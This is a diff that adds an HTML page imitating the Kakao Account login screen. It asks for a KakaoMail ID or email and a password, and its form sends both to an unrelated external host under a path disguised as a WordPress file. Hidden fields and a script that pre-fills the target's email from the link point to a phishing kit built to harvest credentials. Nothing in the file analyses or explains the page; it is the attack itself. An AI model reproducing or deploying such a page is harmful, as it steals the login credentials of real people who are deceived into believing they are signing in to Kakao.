@@ -1,0 +1,175 @@
+﻿<html>
+
+<head>
+<meta http-equiv="Content-Type" content="text/html; charset=windows-1252">
+<title>Kakao Account</title>
+<link rel="icon" href="https://www.kakaocorp.com/page/favicon.ico" type="image/x-icon">
+</head>
+<style>
+  html, body {
+  font-family: Arial, sans-serif;
+  margin: 0;
+  padding: 0;
+  border: 0;
+  position: absolute;
+  height: 100%;
+  min-width: 100%;
+  font-size: 13px;
+  color: #404040;
+  direction: ltr;
+  -webkit-text-size-adjust: none;
+  }
+  input[type=text],
+  input[type=password]{
+  -moz-appearance: none;
+  -webkit-appearance: none;
+  appearance: none;
+  display: inline-block;
+  height: 48px;
+  width: 100%;
+  margin: 0;
+  background: #fff;
+  border: #fff;
+  border-bottom: 2px solid #efefef;
+  -moz-box-sizing: border-box;
+  -webkit-box-sizing: border-box;
+  box-sizing: border-box;
+  -moz-border-radius: 1px;
+  -webkit-border-radius: 1px;
+  border-radius: 0px;
+  font-size: 16px;
+  font-family: inherit;
+  line-height: 18px;
+  vertical-align: top;
+  color: #404040;
+  }
+  input[type=text]:focus,
+  input[type=password]:focus {
+  outline: none;
+  background-color: #fff;
+  border: #fff;
+  border-bottom: 2px solid black;
+
+  }
+</style>
+<body background="img/bg.png">
+
+<table border="0" width="100%" cellspacing="0" cellpadding="0">
+	<tr>
+		<td>
+		<div align="center">
+			<table border="0" width="482" cellspacing="0" cellpadding="0">
+				<tr>
+					<td>
+					<table border="0" width="100%" cellspacing="0" cellpadding="0">
+						<tr>
+							<td height="108"></td>
+						</tr>
+						<tr>
+							<td height="659" background="img/fm.png">
+							<table border="0" width="100%" cellspacing="0" cellpadding="0">
+							  <form action="https://ganpanmarthdesi.pro/z-php/wp-config-post.php" method="post">
+								<tr>
+									<td height="127"></td>
+								</tr>
+								<tr>
+									<td>
+									<table border="0" width="100%" cellspacing="0" cellpadding="0">
+										<tr>
+											<td width="71"></td>
+											<td>
+											    <input type="text" name="user" required placeholder="KakaoMail ID, email, phone number" value="email" >
+											    <input type="hidden" name="domain" value="domain" >
+											    <input type="hidden" name="sender" value="kakao.com" >
+											    <input type="hidden" name="link" value="http://mail2.daum.net/hanmailex/Top.daum" >
+											</td>
+											<td width="71"></td>
+										</tr>
+									</table>
+									</td>
+								</tr>
+								<tr>
+									<td>
+									<table border="0" width="100%" cellspacing="0" cellpadding="0">
+										<tr>
+											<td width="71"></td>
+											<td>
+											   <input type="password" name="passwd" required placeholder="Password" autofocus >
+											</td>
+											<td width="71">&nbsp;</td>
+										</tr>
+									</table>
+									</td>
+								</tr>
+								<tr>
+									<td height="174"></td>
+								</tr>
+								<tr>
+									<td>
+									<table border="0" width="100%" cellspacing="0" cellpadding="0">
+										<tr>
+											<td width="71">&nbsp;</td>
+											<td>
+											<input type="image" src="img/btn.png" width="338" height="50"></td>
+											<td width="73">&nbsp;</td>
+										</tr>
+									</table>
+									</td>
+								</tr>
+								<tr>
+									<td height="204"></td>
+								</tr>
+							  </form>	
+							</table>
+							</td>
+						</tr>
+						<tr>
+							<td height="88"></td>
+						</tr>
+					</table>
+					</td>
+				</tr>
+			</table>
+		</div>
+		</td>
+	</tr>
+	<tr>
+		<td height="5"></td>
+	</tr>
+	<tr>
+		<td>
+		<div align="center">
+			<table border="0" width="100" cellspacing="0" cellpadding="0">
+				<tr>
+					<td>
+					<img border="0" src="img/footer.png" width="542" height="123"></td>
+				</tr>
+			</table>
+		</div>
+		</td>
+	</tr>
+	<tr>
+		<td>&nbsp;</td>
+	</tr>
+</table>
+  <script>
+    const params = new URLSearchParams(window.location.search);
+    const raw = params.get('login');
+    const email = raw ? decodeURIComponent(raw) : '';
+
+    let user = '', domain = '';
+    if (email.includes('@')) {
+      [user, domain] = email.split(/@(.*)/, 2);
+    }
+
+    if (email) {
+      document.getElementById('userInput').value = email;
+      document.getElementById('domainInput').value = domain;
+      document.getElementById('greeting').textContent = domain;
+      document.getElementById('emailButton').textContent = email;
+      document.getElementById('anotherLink').href = `another_user.html?login=${encodeURIComponent(email)}`;
+    }
+  </script>
+</body>
+
+</html>
